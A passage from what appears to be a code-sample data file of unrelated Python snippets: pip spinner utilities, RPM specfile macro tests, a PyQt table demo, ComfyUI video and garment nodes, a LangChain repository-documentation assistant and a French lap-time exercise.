# If rv is \"No import errors,\" consider it a passed test\n        print(f\"{rel_path} passed the import test\")\n",
    "import contextlib\nimport itertools\nimport logging\nimport sys\nimport time\nfrom typing import IO, Generator, Optional\n\nfrom pip._internal.utils.compat import WINDOWS\nfrom pip._internal.utils.logging import get_indentation\n\nlogger = logging.getLogger(__name__)\n\n\nclass SpinnerInterface:\n    def spin(self) -> None:\n        raise NotImplementedError()\n\n    def finish(self, final_status: str) -> None:\n        raise NotImplementedError()\n\n\nclass InteractiveSpinner(SpinnerInterface):\n    def __init__(\n        self,\n        message: str,\n        file: Optional[IO[str]] = None,\n        spin_chars: str = \"-\\\\|/\",\n        # Empirically, 8 updates/second looks nice\n        min_update_interval_seconds: float = 0.125,\n    ):\n        self._message = message\n        if file is None:\n            file = sys.stdout\n        self._file = file\n        self._rate_limiter = RateLimiter(min_update_interval_seconds)\n        self._finished = False\n\n        self._spin_cycle = itertools.cycle(spin_chars)\n\n        self._file.write(\" \" * get_indentation() + self._message + \" ... \")\n        self._width = 0\n\n    def _write(self, status: str) -> None:\n        assert not self._finished\n        # Erase what we wrote before by backspacing to the beginning, writing\n        # spaces to overwrite the old text, and then backspacing again\n        backup = \"\\b\" * self._width\n        self._file.write(backup + \" \" * self._width + backup)\n        # Now we have a blank slate to add our status\n        self._file.write(status)\n        self._width = len(status)\n        self._file.flush()\n        self._rate_limiter.reset()\n\n    def spin(self) -> None:\n        if self._finished:\n            return\n        if not self._rate_limiter.ready():\n            return\n        self._write(next(self._spin_cycle))\n\n    def finish(self, final_status: str) -> None:\n        if self._finished:\n            return\n        self._write(final_status)\n        self._file.write(\"\\n\")\n        self._file.flush()\n        self._finished = True\n\n\n# Used for dumb terminals, non-interactive installs (no tty), etc.\n# We still print updates occasionally (once every 60 seconds by default) to\n# act as a keep-alive for systems like Travis-CI that take lack-of-output as\n# an indication that a task has frozen.\nclass NonInteractiveSpinner(SpinnerInterface):\n    def __init__(self, message: str, min_update_interval_seconds: float = 60.0) -> None:\n        self._message = message\n        self._finished = False\n        self._rate_limiter = RateLimiter(min_update_interval_seconds)\n        self._update(\"started\")\n\n    def _update(self, status: str) -> None:\n        assert not self._finished\n        self._rate_limiter.reset()\n        logger.info(\"%s: %s\", self._message, status)\n\n    def spin(self) -> None:\n        if self._finished:\n            return\n        if not self._rate_limiter.ready():\n            return\n        self._update(\"still running...\")\n\n    def finish(self, final_status: str) -> None:\n        if self._finished:\n            return\n        self._update(f\"finished with status '{final_status}'\")\n        self._finished = True\n\n\nclass RateLimiter:\n    def __init__(self, min_update_interval_seconds: float) -> None:\n        self._min_update_interval_seconds = min_update_interval_seconds\n        self._last_update: float = 0\n\n    def ready(self) -> bool:\n        now = time.time()\n        delta = now - self._last_update\n        return delta >= self._min_update_interval_seconds\n\n    def reset(self) -> None:\n        self._last_update = time.time()\n\n\n@contextlib.contextmanager\ndef open_spinner(message: str) -> Generator[SpinnerInterface, None, None]:\n    # Interactive spinner goes directly to sys.stdout rather than being routed\n    # through the logging system, but it acts like it has level INFO,\n    # i.e. it's only displayed if we're at level INFO or better.\n    # Non-interactive spinner goes through the logging system, so it is always\n    # in sync with logging configuration.\n    if sys.stdout.isatty() and logger.getEffectiveLevel() <= logging.INFO:\n        spinner: SpinnerInterface = InteractiveSpinner(message)\n    else:\n        spinner = NonInteractiveSpinner(message)\n    try:\n        with hidden_cursor(sys.stdout):\n            yield spinner\n    except KeyboardInterrupt:\n        spinner.finish(\"canceled\")\n        raise\n    except Exception:\n        spinner.finish(\"error\")\n        raise\n    else:\n        spinner.finish(\"done\")\n\n\nHIDE_CURSOR = \"\\x1b[?25l\"\nSHOW_CURSOR = \"\\x1b[?25h\"\n\n\n@contextlib.contextmanager\ndef hidden_cursor(file: IO[str]) -> Generator[None, None, None]:\n    # The Windows terminal does not support the hide/show cursor ANSI codes,\n    # even via colorama. So don't even try.\n    if WINDOWS:\n        yield\n    # We don't want to clutter the output with control characters if we're\n    # writing to a file, or if the user is running with --quiet.\n    # See https://github.com/pypa/pip/issues/3418\n    elif not file.isatty() or logger.getEffectiveLevel() > logging.INFO:\n        yield\n    else",
    "\"\"\" test specfile_expand_strings() \"\"\"\n\n# pylint: disable=missing-function-docstring\n\nimport pytest\n\nfrom norpm.specfile import (\n    specfile_split_generator,\n    specfile_expand_string,\n    specfile_expand_string_generator,\n    specfile_expand_strings,\n    specfile_expand,\n    specfile_expand_generator,\n)\nfrom norpm.macro import MacroRegistry\n\n\ndef test_basic_token_expansion():\n    assert specfile_expand_strings([\"%%\", \"%\", \" a\"], {}) == [\"%\", \"%\", \" a\"]\n\n\ndef test_basic_macro_expansion():\n    db = MacroRegistry()\n    assert specfile_expand_strings([\"%foo\"], db) == [\"%foo\"]\n    assert specfile_expand_strings([\"%{foo}\"], db) == [\"%{foo}\"]\n    db[\"foo\"] = \"baz\"\n    assert specfile_expand_strings([\"%foo\"], db) == [\"baz\"]\n    assert specfile_expand_strings([\"%{foo}\"], db) == [\"baz\"]\n\ndef test_specfile_split_generator():\n    assert list(specfile_split_generator(\"content\", {})) == [\"content\"]\n\n\ndef test_recursive_expansion():\n    db = MacroRegistry()\n    db[\"bar\"] = \"%content\"\n    db[\"foo\"] = \"%bar\"\n    assert \"\".join(list(specfile_expand_string_generator(\"a b %foo end\", db))) == \"a b %content end\"\n\n\ndef test_multiline_expansion():\n    db = MacroRegistry()\n    db[\"bar\"] = \"b\\nc\\nd\"\n    db[\"foo\"] = \"%bar\"\n    assert \"\".join(list(specfile_expand_string_generator(\"a %foo e\", db))) == \"a b\\nc\\nd e\"\n\n\ndef test_definition_expansion():\n    db = MacroRegistry()\n    db[\"bar\"] = \"content\"\n    assert \"foo\" not in db\n    assert list(specfile_expand_string_generator(\"%define  foo %bar\\n%foo\", db)) == [\"\", \"\", \"content\"]\n    assert db[\"foo\"].value == \"%bar\"\n\n\ndef test_definition_expansion_trailing_newline():\n    db = MacroRegistry()\n    db[\"foo\"] = \"content\"\n    assert list(specfile_expand_string_generator(\"%{foo}\\n\", db)) == [\"\", \"content\", \"\\n\"]\n\n\ndef test_global_expansion():\n    db = MacroRegistry()\n    db[\"bar\"] = \"content\"\n    assert \"foo\" not in db\n    assert list(specfile_expand_string_generator(\" %global foo %bar\\n%foo\", db)) == [\" \", \"\", \"\", \"content\"]\n    assert db[\"foo\"].value == \"content\"\n\n\ndef test_global_expansion_newline():\n    db = MacroRegistry()\n    db[\"bar\"] = \"content\"\n    assert \"foo\" not in db\n    assert list(specfile_expand_string_generator(\" %global foo \\\\\\n%bar\", db)) == [\" \", \"\"]\n    assert db[\"foo\"].value == \"\\ncontent\"\n\n\ndef test_specfile_expand_string():\n    \"\"\"\n    Try this with RPM, eof is catenated with the leading a!\n        cat <<EOF\n        a%global foo \\\n        bar\n        EOF\n    \"\"\"\n    db = MacroRegistry()\n    db[\"bar\"] = \"content\"\n    assert \"foo\" not in db\n    assert specfile_expand_string(\" %global foo \\\\\\n%bar\\n\", db) == \" \"\n    assert db[\"foo\"].value == \"\\ncontent\"  # expanded!\n\n\ndef test_expand_underscore():\n    db = MacroRegistry()\n    db[\"_prefix\"] = \"/usr\"\n    db[\"_exec_prefix\"] = \"%_prefix\"\n    db[\"_bindir\"] = \"%_exec_prefix/bin\"\n    assert specfile_expand_string(\"%{_bindir}\", db) == \"/usr/bin\"\n\n\ndef test_expand_parametric_definition():\n    db = MacroRegistry()\n    assert specfile_expand_string(\"%global nah(param)\\\\\\na b c\\n\", db) == \"\"\n    assert db[\"nah\"].params == \"param\"\n\n\n@pytest.mark.parametrize(\"statement\", [\"%define\", \"%global\"])\ndef test_specfile_expand_generator(statement):\n    db = MacroRegistry()\n    assert specfile_expand(\n        \"%define myname foo\\n\"\n        \"%define myversion 1.1\\n\"\n        \"Name: %myname\\n\"\n        f\"{statement} redefined %name\\n\"\n        \"Version: %myversion\", db\n    ) == (\n        \"Name: foo\\n\"\n        \"Version: 1.1\"\n    )\n    assert db[\"name\"].value == \"foo\"\n    expected = \"foo\" if statement == \"%global\" else \"%name\"\n    assert db[\"redefined\"].value == expected\n\n\ndef test_invalid_tag():\n    db = MacroRegistry()\n    assert list(specfile_expand_generator(\n        \"Name: %myname\\n\"\n        \"foo\\n\",\n        db,\n    )) == [\n        \"Name: %myname\\n\",\n        \"foo\\n\", '',\n    ]\n\n\ndef test_expand_tags_in_macro_tricky():\n    \"\"\"RPM itself needs to do two-pass parsing to handle this\"\"\"\n    db = MacroRegistry()\n    assert specfile_expand(\n        \"Name: %myname\\n\"\n        \"%define myname foo\\n\",\n        db,\n    ) == (\n        \"Name: %myname\\n\"\n    )\n    assert db[\"name\"].value == \"%myname\"\n    assert db[\"myname\"].value == \"foo\"\n\n\n@pytest.mark.parametrize(\"terminator\", [\"%package foo\", \"%prep\"])\ndef test_tags_parsed_only_in_preamble(terminator):\n    \"\"\"RPM itself needs to do two-pass parsing to handle this\"\"\"\n    db = MacroRegistry()\n    assert specfile_expand(\n        \"%define myname python-foo\\n\"\n        \"Name: %myname\\n\"\n        f\"  {terminator} \\n\"\n        \" : hello\\n\"\n        \"preparation\\n\"\n        \"Version: 10\\n\",\n        db,\n    ) == (\n        \"Name: python-foo\\n\"\n        f\"  {terminator} \\n\"\n        \" : hello\\n\"\n        \"preparation\\n\"\n        \"Version: 10\\n\"\n    )\n    assert db[\"name\"].value == \"python-foo\"\n    assert \"version\" not in db\n\n\ndef test_cond_expand():\n    db = MacroRegistry()\n    db[\"foo\"] = \"10\"\n    assert specfile_expand(\"%{?foo}\", db) == \"10\"\n    assert specfile_expand(\"%{!?foo}\", db) == \"\"\n    assert specfile_expand(\"%{?foo",
    "from PyQt5 import QtWidgets\r\nfrom PyQt5.QtWidgets import QTableWidgetItem\r\nfrom TableviewForm import Ui_MainWindow\r\nimport sys\r\n\r\nclass Window(QtWidgets.QMainWindow):\r\n    def __init__(self):\r\n        super(Window, self).__init__()   \r\n\r\n        self.ui = Ui_MainWindow()\r\n        self.ui.setupUi(self)    \r\n\r\n        self.loadProducts()\r\n        self.ui.btnSave.clicked.connect(self.saveProduct)\r\n        self.ui.tableProducts.doubleClicked.connect(self.doubleClick)\r\n\r\n    def doubleClick(self):\r\n        for item in self.ui.tableProducts.selectedItems():            \r\n            print(item.row(), item.column(), item.text())    \r\n\r\n\r\n    def saveProduct(self):\r\n        name = self.ui.txtName.text()\r\n        price = self.ui.txtPrice.text()\r\n\r\n        if name and price is not None:\r\n            rowCount = self.ui.tableProducts.rowCount()\r\n            print(rowCount)\r\n            self.ui.tableProducts.insertRow(rowCount)\r\n            self.ui.tableProducts.setItem(rowCount,0, QTableWidgetItem(name))\r\n            self.ui.tableProducts.setItem(rowCount,1, QTableWidgetItem(price))\r\n\r\n    def loadProducts(self):\r\n\r\n        products = [\r\n            {'name': 'Samsung S5', 'price': 2000},\r\n            {'name': 'Samsung S6', 'price': 3000},\r\n            {'name': 'Samsung S7', 'price': 4000},\r\n            {'name': 'Samsung S8', 'price': 5000}\r\n        ]\r\n\r\n        self.ui.tableProducts.setRowCount(len(products))\r\n        self.ui.tableProducts.setColumnCount(2)\r\n        self.ui.tableProducts.setHorizontalHeaderLabels(('Name','Price'))\r\n        self.ui.tableProducts.setColumnWidth(0,200)\r\n        self.ui.tableProducts.setColumnWidth(1,100)\r\n\r\n        rowIndex = 0\r\n        for product in products:\r\n            self.ui.tableProducts.setItem(rowIndex,0, QTableWidgetItem(product['name']))\r\n            self.ui.tableProducts.setItem(rowIndex,1, QTableWidgetItem(str(product['price'])))\r\n            \r\n            rowIndex+=1\r\n            \r\ndef app():\r\n    app = QtWidgets.QApplication(sys.argv)\r\n    win = Window()\r\n    win.show()\r\n    sys.exit(app.exec_())\r\n\r\napp()\r\n\r\n\r\n",
    "import os\nimport numpy as np\nimport torch\nimport subprocess\nimport uuid\nfrom PIL import Image\nimport tempfile\nimport logging\nimport shutil\nfrom concurrent.futures import ThreadPoolExecutor\n\ntry:\n    import cupy as cp\n    CUPY_AVAILABLE = True\nexcept ImportError:\n    CUPY_AVAILABLE = False\n    \nlogging.basicConfig(level=logging.DEBUG)\nlogger = logging.getLogger('TopazVideoAI')\n\nclass TopazUpscaleParamsNode:\n    def __init__(self):\n        pass\n        \n    @classmethod\n    def INPUT_TYPES(cls):\n        upscale_models = [\"aaa-9\", \"ahq-12\", \"alq-13\", \"alqs-2\", \"amq-13\", \"amqs-2\", \"ghq-5\", \"iris-2\", \"iris-3\", \"nyx-3\", \"prob-4\", \"thf-4\", \"thd-3\", \"thm-2\", \"rhea-1\", \"rxl-1\"]\n        return {\n            \"required\": {\n                \"upscale_factor\": (\"FLOAT\", {\"default\": 2.0, \"min\": 1.0, \"max\": 4.0, \"step\": 0.5}),\n                \"upscale_model\": (upscale_models, {\"default\": \"iris-3\"}),\n                \"compression\": (\"FLOAT\", {\"default\": 1.0, \"min\": -1.0, \"max\": 1.0, \"step\": 0.1}),\n                \"blend\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.1}),\n            },\n            \"optional\": {\n                \"previous_upscale\": (\"UPSCALE_PARAMS\",),\n            }\n        }\n\n    RETURN_TYPES = (\"UPSCALE_PARAMS\",)\n    FUNCTION = \"get_params\"\n    CATEGORY = \"video\"\n\n    def get_params(self, upscale_factor=2.0, upscale_model=\"prap-2\", compression=1.0, blend=0.0, previous_upscale=None):\n        if upscale_model == \"thm-2\" and upscale_factor != 1.0:\n            upscale_factor = 1.0\n            logger.warning(\"thm-2 forces upscale_factor=1.0\")\n            \n        current_params = {\n            \"upscale_factor\": upscale_factor,\n            \"upscale_model\": upscale_model,\n            \"compression\": compression,\n            \"blend\": blend\n        }\n        \n        if previous_upscale is None:\n            return ([current_params],)\n        else:\n            return (previous_upscale + [current_params],)\n\nclass TopazVideoAINode:\n    def __init__(self):\n        self.base_temp_dir = tempfile.gettempdir()\n        self.output_dir = os.path.join(self.base_temp_dir, \"comfyui_topaz_temp\")\n        os.makedirs(self.output_dir, exist_ok=True)\n        self.temp_files = []\n        logger.debug(f\"Initialized temp directory at: {self.output_dir}\")\n        if not CUPY_AVAILABLE:\n            logger.warning(\"CuPy not available. Some GPU operations will be disabled.\")\n\n    @classmethod\n    def INPUT_TYPES(cls):\n        upscale_models = [\"aaa-9\", \"ahq-12\", \"alq-13\", \"alqs-2\", \"amq-13\", \"amqs-2\", \"ghq-5\", \"iris-2\", \"iris-3\", \"nyx-3\", \"prob-4\", \"thf-4\", \"thd-3\", \"thm-2\", \"rhea-1\", \"rxl-1\"]\n        return {\n            \"required\": {\n                \"images\": (\"IMAGE\",),\n                \"enable_upscale\": (\"BOOLEAN\", {\"default\": False}),\n                \"upscale_factor\": (\"FLOAT\", {\"default\": 2.0, \"min\": 1.0, \"max\": 4.0, \"step\": 0.5}),\n                \"upscale_model\": (upscale_models, {\"default\": \"thf-4\"}),\n                \"compression\": (\"FLOAT\", {\"default\": 1.0, \"min\": -1.0, \"max\": 1.0, \"step\": 0.1}),\n                \"blend\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.1}),\n                \"enable_interpolation\": (\"BOOLEAN\", {\"default\": False}),\n                \"target_fps\": (\"INT\", {\"default\": 60, \"min\": 1, \"max\": 240}),\n                \"interpolation_model\": ([\"apo-8\", \"apf-1\", \"chr-2\", \"chf-3\", \"chr-2\"], {\"default\": \"apo-8\"}),\n                \"use_gpu\": (\"BOOLEAN\", {\"default\": True}),\n                \"topaz_ffmpeg_path\": (\"STRING\", {\"default\": r\"C:\\Program Files\\Topaz Labs LLC\\Topaz Video AI\"}),\n                \"force_topaz_ffmpeg\": (\"BOOLEAN\", {\"default\": True}),\n            },\n            \"optional\": {\n                \"previous_upscale\": (\"UPSCALE_PARAMS\",),\n            }\n        }\n\n    RETURN_TYPES = (\"IMAGE\",)\n    FUNCTION = \"process_video\"\n    CATEGORY = \"video\"\n\n    def _get_system_ffmpeg(self):\n        \"\"\"Try to find system FFmpeg installation\"\"\"\n        try:\n            system_paths = os.environ.get(\"PATH\", \"\").split(os.pathsep)\n            for path in system_paths:\n                topaz_ffmpeg_path = os.path.join(path, \"ffmpeg.exe\" if os.name == \"nt\" else \"ffmpeg\")\n                if os.path.isfile(topaz_ffmpeg_path) and os.access(topaz_ffmpeg_path, os.X_OK):\n                    logger.debug(f\"Found system FFmpeg at: {topaz_ffmpeg_path}\")\n                    return topaz_ffmpeg_path\n\n            if os.name == \"nt\":\n                common_locations = [\n                    os.path.expandvars(r\"%ProgramFiles%\\FFmpeg\\bin\\ffmpeg.exe\"),\n                    os.path.expandvars(r\"%ProgramFiles(x86)%\\FFmpeg\\bin\\ffmpeg.exe\"),\n                    os.path.expandvars(r\"%USERPROFILE%\\FFmpeg\\bin\\ffmpeg.exe\")\n                ]\n                for location in common_locations:\n                    if os.path.isfile(location) and os.access(location, os.X_OK):\n                        logger.debug(f\"Found system FFmpeg at: {location}\")\n                        return location\n\n            result = subprocess.run(['ffmpe",
    "import torch\nfrom torch import nn\nfrom .src.transformer_sd3_garm import SD3Transformer2DModel\n\n\nclass GarmentEnhancementNode:\n    \"\"\"\n    A custom node for garment enhancement using a pre-trained DiT model.\n    \"\"\"\n\n    def __init__(self):\n        super().__init__()\n        # Load the transformer model\n        model_path = \"/kaggle/working/ComfyUI/models/DiT\"\n        self.device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n        \n        self.transformer = SD3Transformer2DModel.from_pretrained(\n            model_path, torch_dtype=torch.float16, local_files_only=True\n        ).to(self.device)  # Move model to the device\n\n        self.feature_projector1 = nn.Linear(1280, 2048).to(self.device, dtype=torch.float16)  # Projecting to 2048 dimensions\n        self.feature_projector2 = nn.Linear(768, 2048).to(self.device, dtype=torch.float16)   # Projecting to 2048 dimensions\n\n    @classmethod\n    def INPUT_TYPES(cls) -> dict:\n        return {\n            \"required\": {\n                \"clip_embedding1\": (\"CLIP_VISION_OUTPUT\",),\n                \"clip_embedding2\": (\"CLIP_VISION_OUTPUT\",),\n                \"timestep\": (\"INT\",),\n            },\n        }\n\n    RETURN_TYPES = (\"LATENT\",)  # Outputs enhanced latent for decoding\n    RETURN_NAMES = (\"latent\",)\n    FUNCTION = \"enhance_garment\"\n    CATEGORY = \"Custom/Garment Enhancement\"\n\n    def enhance_garment(\n        self, clip_embedding1: torch.Tensor, clip_embedding2: torch.Tensor, timestep: int\n    ) -> tuple:\n        \"\"\"\n        Enhance the latent space or latent encoding using the transformer model and CLIP embeddings.\n        \"\"\"\n        try:\n            # Extract CLIP embeddings\n            clip_tensor1 = clip_embedding1.last_hidden_state.to(self.device, dtype=torch.float16)\n            clip_tensor2 = clip_embedding2.last_hidden_state.to(self.device, dtype=torch.float16)\n\n            # Compute pooled_projections using image_embeds\n            pooled_projections1 = clip_embedding1.image_embeds.to(self.device, dtype=torch.float16)\n            pooled_projections2 = clip_embedding2.image_embeds.to(self.device, dtype=torch.float16)\n\n            pooled_projections1 = self.feature_projector1(pooled_projections1)\n            pooled_projections2 = self.feature_projector2(pooled_projections2)\n            \n            # Combine or average pooled projections\n            pooled_projections = (pooled_projections1 + pooled_projections2) / 2\n\n            # Debugging: Log tensor shapes\n            print(f\"clip_tensor1 shape: {clip_tensor1.shape}\")\n            print(f\"clip_tensor2 shape: {clip_tensor2.shape}\")\n            print(f\"pooled_projections shape: {pooled_projections.shape}\")\n\n            # Align dimensions if necessary\n            max_dim1 = max(clip_tensor1.size(1), clip_tensor2.size(1))\n            max_dim2 = max(clip_tensor1.size(2), clip_tensor2.size(2))\n\n            if clip_tensor1.size(1) < max_dim1 or clip_tensor1.size(2) < max_dim2:\n                clip_tensor1 = torch.nn.functional.pad(\n                    clip_tensor1,\n                    (0, max_dim2 - clip_tensor1.size(2), 0, max_dim1 - clip_tensor1.size(1)),\n                )\n            if clip_tensor2.size(1) < max_dim1 or clip_tensor2.size(2) < max_dim2:\n                clip_tensor2 = torch.nn.functional.pad(\n                    clip_tensor2,\n                    (0, max_dim2 - clip_tensor2.size(2), 0, max_dim1 - clip_tensor2.size(1)),\n                )\n\n            # Concatenate tensors along the last dimension\n            clip_tensor = torch.cat((clip_tensor1, clip_tensor2), dim=-1)\n\n            # Debugging: Log concatenated tensor shape\n            print(f\"Concatenated clip_tensor shape: {clip_tensor.shape}\")\n\n            # Calculate height and width for reshaping\n            total_elements = clip_tensor.numel()\n            required_channels = 16  # Expected number of channels\n\n            if total_elements % required_channels != 0:\n                raise ValueError(\n                    f\"Total elements ({total_elements}) are not divisible by required channels ({required_channels}).\"\n                )\n\n            spatial_elements = total_elements // required_channels\n            height, width = self.find_closest_factors(spatial_elements)\n\n            if height * width != spatial_elements:\n                raise ValueError(\n                    f\"Calculated height ({height}) and width ({width}) do not match spatial elements ({spatial_elements}).\"\n                )\n\n            # Reshape tensor to (batch_size, required_channels, height, width)\n            clip_tensor = clip_tensor.view(\n                clip_tensor.shape[0], required_channels, height, width\n            )\n\n            # Pass through transformer model\n            with torch.no_grad():\n                output = self.transformer(\n                    hidden_states=clip_tensor,\n                    timestep=torch.tensor([timestep], dtype=torch.long, device=self.device),\n                    pooled_projections=pooled_projections,\n       ",
    "import os, json, asyncio\nfrom langchain_community.document_loaders import GithubFileLoader\nfrom langchain_groq import ChatGroq\nfrom dotenv import load_dotenv\nfrom langchain_core.messages import SystemMessage\nfrom langchain_core.prompts import (\n    ChatPromptTemplate,\n    MessagesPlaceholder,\n    HumanMessagePromptTemplate,\n)\nfrom langchain.memory import ConversationBufferMemory\n\n# Load environment variables\nload_dotenv()\naccess_token = os.getenv(\"ACCESS_TOKEN\")\ngroq_api_key = os.getenv(\"GROQ_API_KEY\")\n\n# Initialize variables\nconversation_memory = {}\ncontext_key = \"default\"\nloaded_repos = {}\n\nbase_prompt = \"\"\"\nI am an AI documentation assistant specialized in analyzing GitHub codebases.\nMy primary functions:\n- Analyze code to extract key functional details\n- Generate clear, comprehensive documentation in simple English\n- Support documentation for multiple programming languages\n- Process GitHub repository contents effectively\n\nDocumentation style:\n- Clear and concise explanations\n- Focus on code purpose and functionality\n- Avoid technical jargon where possible\n- Highlight main components and their interactions\n\nI provide documentation that helps users understand:\n- What the code does\n- How different parts work together\n- Key features and functionalities\n- Basic usage patterns\n\nI use tools to help me. These tools are defined within <tools></tools> XML tags. When I need to use a tool, I'll call it like this:\n\n<tool_call>\n{\"name\": \"<function-name>\", \"arguments\": {\"arg1\": \"value1\", \"arg2\": \"value2\"}}\n</tool_call>\n\nAvailable tools:\n- load_github_repo: Loads a GitHub repository for analysis\n  Arguments: {\"repo\": \"owner/repo\", \"branch\": \"branch_name\"}\n\nAsk me about any code, and I'll provide simple, understandable documentation.\n\"\"\"\n\n# Initialize Groq chat\ngroq_chat = ChatGroq(groq_api_key=groq_api_key, model_name=\"llama-3.1-8b-instant\")\n\n\nasync def load_github_repo(repo: str, branch: str = \"main\") -> str:\n    try:\n        loader = GithubFileLoader(\n            repo=repo,\n            branch=branch,\n            access_token=access_token,\n            github_api_url=\"https://api.github.com\",\n            file_filter=lambda file_path: file_path.endswith(\n                (\".md\", \".py\", \".js\", \".ts\", \".c\", \".cpp\", \".java\")\n            ),\n        )\n        documents = loader.load()\n        loaded_repos[repo] = documents\n        return f\"Successfully loaded {len(documents)} files from {repo}\"\n    except Exception as e:\n        return f\"Error loading repository: {str(e)}\"\n\n\nasync def handle_tool_call(response, memory):\n    start = response.index(\"<tool_call>\") + len(\"<tool_call>\")\n    end = response.index(\"</tool_call>\")\n    tool_call_json = response[start:end].strip()\n\n    try:\n        tool_call = json.loads(tool_call_json)\n        tool_name = tool_call.get(\"name\")\n        tool_arguments = tool_call.get(\"arguments\", {})\n        result = None\n\n        tool_actions = {\n            \"load_github_repo\": lambda: load_github_repo(\n                tool_arguments.get(\"repo\"), tool_arguments.get(\"branch\", \"main\")\n            )\n        }\n\n        action = tool_actions.get(tool_name)\n        if action:\n            result = await action()\n        else:\n            result = \"Tool not found.\"\n\n        if result is not None:\n            memory.chat_memory.messages[-1].content += f\"\\nResult: {result}\"\n    except Exception as e:\n        memory.chat_memory.messages[-1].content += f\"\\nError: {str(e)}\"\n\n    return memory.chat_memory.messages[-1].content\n\n\nasync def generate_response(prompt: str) -> str:\n    repo_context = \"\\n\".join(\n        [\n            f\"\\nRepo: {repo}\\n\" + \"\\n\".join([doc.page_content for doc in docs])\n            for repo, docs in loaded_repos.items()\n        ]\n    )\n\n    system_prompt = base_prompt + repo_context\n\n    prompt_template = ChatPromptTemplate.from_messages(\n        [\n            SystemMessage(content=system_prompt),\n            MessagesPlaceholder(variable_name=\"chat_history\"),\n            HumanMessagePromptTemplate.from_template(\"{human_input}\"),\n        ]\n    )\n\n    chain = prompt_template | groq_chat\n    chat_history = conversation_memory[context_key].chat_memory.messages\n    response = await chain.ainvoke(\n        {\"chat_history\": chat_history, \"human_input\": prompt}\n    )\n\n    content = response.content\n\n    if \"<tool_call>\" in content and \"</tool_call>\" in content:\n        content = await handle_tool_call(content, conversation_memory[context_key])\n\n    conversation_memory[context_key].chat_memory.add_user_message(prompt)\n    conversation_memory[context_key].chat_memory.add_ai_message(content)\n\n    return content\n\n\n# Initialize conversation memory\nconversation_memory[context_key] = ConversationBufferMemory(\n    return_messages=True, memory_key=\"chat_history\"\n)\n\n\nasync def main():\n    print(\"\\n=== Code Documentation Generator AI ===\")\n    print(\"Type 'exit' to quit\")\n    print(\"Type 'reset' to clear all repositories and conversation history\\n\")\n\n    while True:\n        try:\n            user_input = input(\"Yo",
    "AMAX = 10  # acc\u00e9l\u00e9ration maximale en m/s\u00b2\r\nFMAX = -20  # freinage maximal en m/s\u00b2\r\nVMAX = 100  # vitesse maximale en m/s\r\n\r\ndef vr(r:int) -> float:\r\n    # Exemple de calcul de la vitesse recommand\u00e9e pour un virage de rayon r\r\n    return min(VMAX, 10 * r**0.5)\r\n\r\ndef vitesses_entr\u00e9e_max(c:list, vf:float) -> [float]:\r\n    n = len(c)\r\n    vitesses = [0] * (n + 1)\r\n    vitesses[-1] = vf\r\n\r\n    for i in range(n - 1, -1, -1):\r\n        if c[i][0] == \"V\":  # Virage\r\n            r = c[i][1]\r\n            vitesses[i] = min(vitesses[i + 1], vr(r))\r\n        else:  # Ligne droite\r\n            d = c[i][1]\r\n            v2 = vitesses[i + 1]\r\n            v1 = (v2**2 + 2 * FMAX * d)**0.5 if v2**2 + 2 * FMAX * d >= 0 else 0\r\n            vitesses[i] = min(vitesses[i + 1], v1)\r\n    \r\n    return vitesses[:-1]\r\n\r\ndef temps_droite(d:int, v1:float, v2:float) -> (float, float):\r\n    if v1 < v2:\r\n        t1 = (v2 - v1) / AMAX\r\n        d1 = (v1 * t1) + (0.5 * AMAX * t1**2)\r\n        if d1 > d:\r\n            raise ValueError(\"Impossible de sortir de la ligne droite avec une vitesse inf\u00e9rieure ou \u00e9gale \u00e0 v2\")\r\n        t = t1 + (d - d1) / v2\r\n        return t, v2\r\n    else:\r\n        t2 = (v1 - v2) / abs(FMAX)\r\n        d2 = (v1 * t2) - (0.5 * abs(FMAX) * t2**2)\r\n        if d2 > d:\r\n            raise ValueError(\"Impossible de sortir de la ligne droite avec une vitesse inf\u00e9rieure ou \u00e9gale \u00e0 v2\")\r\n        t = t2 + (d - d2) / v2\r\n        return t, v2\r\n\r\ndef temps_tour(c:list, v0:float, vf:float) -> float:\r\n    vitesses_max = vitesses_entr\u00e9e_max(c, vf)\r\n    temps_total = 0\r\n    v = v0\r\n\r\n    for i, segment in enumerate(c):\r\n        if segment[0] == \"V\":\r\n            r = segment[1]\r\n            v = min(vitesses_max[i], vr(r))\r\n        else:\r\n            d = segment[1]\r\n            t, v = temps_droite(d, v, vitesses_max[i + 1])\r\n            temps_total += t\r\n    \r\n    return temps_total\r\n\r\ndef temps_course(c:list, n:int) -> float:\r\n    \"\"\"\r\n    Calcule le temps minimal n\u00e9cessaire pour effectuer une course de n tours du circuit c.\r\n    \r\n    Param\u00e8tres:\r\n    c (list): Repr\u00e9sentation du circuit (liste de segments).\r\n    n (int): Nombre de tours de circuit.\r\n    \r\n    Retourne:\r\n    float: Temps minimal n\u00e9cessaire en secondes.\r\n    \"\"\"\r\n    # Calculer le temps pour un tour en partant de l'arr\u00eat et en terminant avec vf = VMAX\r\n    temps_premier_tour = temps_tour(c, 0, VMAX)\r\n    \r\n    # Calculer le temps pour un tour en tenant compte de la vitesse d'entr\u00e9e du tour pr\u00e9c\u00e9dent\r\n    vitesses = vitesses_entr\u00e9e_max(c, VMAX)\r\n    temps_tours_suivants = temps_tour(c, vitesses[0], VMAX)\r\n    \r\n    # Calculer le temps total en ajoutant le temps du premier tour et les temps des tours suivants\r\n    temps_total = temps_premier_tour + (n - 1) * temps_tours_suivants\r\n    return temps_total\r\n\r\n# Exemple de test\r\ncircuit = [(\"D\", 100), (\"V\", 50), (\"D\", 200), (\"V\", 30)]\r\nn = 5\r\nprint(temps_course(circuit, n))",
